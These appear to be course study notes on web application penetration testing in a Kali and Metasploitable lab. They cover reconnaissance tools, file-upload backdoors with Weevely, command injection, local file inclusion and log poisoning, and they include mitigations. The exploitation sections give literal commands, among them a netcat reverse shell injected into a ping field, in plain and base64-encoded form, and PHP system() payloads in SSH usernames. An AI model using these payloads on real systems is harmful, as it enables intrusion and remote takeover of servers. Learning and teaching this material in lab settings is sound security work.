[[Security of web applications]]
## Lab Setup

- **Virtual Box Environment**: Creates isolated virtual machines for safe penetration testing
    - **Kali Linux**: A specialized Debian-based Linux distribution pre-loaded with hundreds of security tools. Acts as the attacker machine in penetration tests.
    - **Metasploitable**: Deliberately vulnerable Linux system designed for security training. Contains multiple vulnerable web applications like Mutillidae with pre-configured vulnerabilities.
    - **Configuration Requirements**: Both machines should be on the same network (NAT Network in VirtualBox) to communicate with each other while remaining isolated from your real network.
    - **Verification Steps**: After setup, verify machine connectivity (using ifconfig), test login credentials, and ensure the web server on Metasploitable is accessible from Kali.

## Information Gathering Techniques

1. **WHOIS Protocol Analysis**
    
    - **Purpose**: Acts as the reconnaissance phase of penetration testing
    - **Information Revealed**: Domain registrar, creation/expiration dates, registrant contact details, nameservers
    - **Tools Used**: whois.domaintools.com, who.is
    - **Strategic Value**: Helps identify the domain owner, hosting provider, and potential contact points for social engineering
    - **Usage Example**: Enter a domain name and receive comprehensive registration information that can reveal organizational structure
2. **Technology Detection**
    
    - **Purpose**: Identifies server-side and client-side technologies to target specific vulnerabilities
    - **Information Discovered**: Web server type (Apache, Nginx), programming languages (PHP, Python), frameworks (Laravel, Django), CMS platforms (WordPress, Joomla)
    - **Tools Available**: netcraft.com, builtwith.com, wappalyzer.com, whatcms.org
    - **Exploitation Approach**: Once technologies are identified, cross-reference with exploit-db.com to find known vulnerabilities for those specific versions
    - **Example**: Discovering an outdated WordPress version allows targeting known security issues in that specific release
3. **DNS Analysis**
    
    - **Purpose**: Maps the domain infrastructure and reveals hidden assets
    - **Information Gathered**: IP addresses, subdomains, mail servers, DNS record types
    - **Tools Used**: robtex.com presents visual graphs showing relationships between domains and IPs
    - **Subdomain Discovery**: Find potentially vulnerable testing/development environments using tools like Knock
    - **Cross-Server Analysis**: Identify other websites hosted on the same server that might have weaker security
    - **Command Example**: `python3 knockpy.py target.com` to bruteforce subdomain discovery
4. **Website Structure Discovery**
    
    - **Purpose**: Reveals hidden directories, files, and application structure
    - **Tool Operation**: dirb performs brute force directory and file discovery using wordlists
    - **Command Syntax**: `dirb http://target.com /usr/share/dirb/wordlists/big.txt [options]`
    - **Key Options**:
        - `-r`: Non-recursive search
        - `-o`: Output to file
        - `-u`: Username/password for protected areas
    - **High-Value Discoveries**: Configuration files, backup files, admin interfaces, phpinfo.php pages
    - **Example Target**: Finding unlinked admin panels or configuration files with credentials
5. **Comprehensive Data Collection with Maltego**
    
    - **Purpose**: Visual mapping of all target assets and relationships
    - **Features**: Graphical interface that shows connections between different entities
    - **Entity Types**: Domains, IP addresses, email addresses, people, organizations
    - **Transform Functions**: Automated discovery tools that expand from one entity to related entities
    - **Usage Process**: Start with a domain name, then apply transforms to discover connected infrastructure
    - **Practical Value**: Creates a comprehensive attack surface map for more efficient targeting

## File Upload Vulnerabilities

1. **Basic Exploitation**
    
    - **Vulnerability Mechanism**: Insecure file upload functions allow attackers to upload executable code
    - **Attack Tool**: Weevely generates disguised PHP backdoors that provide shell access
    - **Process Steps**:
        1. Generate backdoor: `weevely generate password shell.php`
        2. Upload the shell through vulnerable form
        3. Connect to shell: `weevely http://target.com/uploads/shell.php password`
        4. Execute commands on the server
    - **Capabilities**: File system access, database access, privilege escalation attempts
2. **Bypass Techniques**
    
    - **Medium Security Bypass**:
        - **Challenge**: Server checks file extensions (only allows .jpg, .png, etc.)
        - **Solution**: Use Burp Suite to intercept HTTP requests
        - **Method**: Upload file with .jpg extension, then modify the filename in transit to .php
        - **Technique**: Intercept the upload request in Burp, modify the Content-Disposition header
    - **High Security Bypass**:
        - **Challenge**: Server checks both file extension and MIME type
        - **Solution**: Use double extensions (.php.jpg) to confuse validation
        - **Method**: Upload file with .php.jpg extension, then modify in transit
        - **Server Behavior**: Some configurations only check the last extension
3. **Mitigation Strategies**
    
    - **Whitelist Extensions**: Only allow specific safe extensions instead of blacklisting dangerous ones
    - **Validate File Content**: Check file headers and content type, not just extensions
    - **Process Uploaded Files**:
        - Recreate images using libraries like php-Imagick
        - Strip metadata that could contain malicious code
        - Generate new filenames to prevent path manipulation
    - **Storage Segregation**: Store uploads outside the web root or on separate services
    - **Implement Content-Disposition**: Force downloads rather than browser execution

## Code Execution Vulnerabilities

1. **Exploitation Methods**
    
    - **Vulnerability Pattern**: Applications that pass user input to system command functions
    - **Command Injection Techniques**:
        - Basic injection: adding a semicolon (`;`) to terminate the original command
        - Example: `ping 10.0.2.4;pwd` executes ping then the pwd command
        - Alternate method: Using pipe (`|`) for command chaining
    - **Reverse Shell Creation**:
        1. Set up listener on attacker machine: `nc -vv -l -p 8081`
        2. Inject command: `10.0.2.4;nc -e /bin/sh 10.0.2.15 8081`
        3. Gain interactive shell access to execute arbitrary commands
    - **Security Level Bypasses**:
        - Low security: Direct command injection with semicolons
        - Medium security: Using pipe characters instead of semicolons
        - Changing ports to avoid blocked connections
2. **Mitigation Approaches**
    
    - **Input Validation**: Use regular expressions to ensure inputs match expected patterns
    - **Avoid Dangerous Functions**: Don't use system(), exec(), shell_exec() with user input
    - **Parameter Binding**: Use prepared statements for database queries
    - **Sandboxing**: Execute commands in restricted environments
    - **Implementation Example**: Validate IP addresses with regex pattern to ensure only valid IPs are processed

## Local File Inclusion Vulnerabilities

1. **Exploitation Techniques**
    
    - **Vulnerability Concept**: Web applications that include files based on user input
    - **Path Traversal**: Using `../` sequences to navigate directory structure
        - Example: `http://10.0.2.5/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd`
    - **Target Files**:
        - `/etc/passwd`: Contains user account information
        - `/proc/self/environ`: Shows environment variables
        - `/var/log/auth.log`: Authentication logs
        - `/var/log/apache2/access.log`: Web server logs
    - **Dynamic Code Execution**:
        - Inject PHP code into User-Agent header via Burp
        - Target reads environment variables via `/proc/self/environ`
        - Code executes when page is included
        - Example: `<?php phpinfo(); ?>` in User-Agent header
    - **Advanced Log Poisoning**:
        - Inject PHP code into log files by making malformed requests
        - SSH login attempts with PHP code as username
        - Encode payloads in base64 to bypass filters
        - Command: `ssh "<?php system(base64_decode('command_in_base64')); ?>"@target.com`
2. **Bypass Methods for Higher Security Levels**
    
    - **Filter Evasion**:
        - Encode malicious PHP code in base64 to avoid character filtering
        - Use alternative PHP tags when standard ones are filtered
    - **Log File Manipulation**:
        - Write to log files via failed authentication attempts
        - Clean up log files to remove error-causing entries
    - **Command Encoding**:
        - Convert shell commands to base64: `bmMgLWUgL2Jpbi9zaCAxMC4wLjIuMTUgODA4MQ==`
        - Decode and execute on target: `base64_decode('encoded_string')`
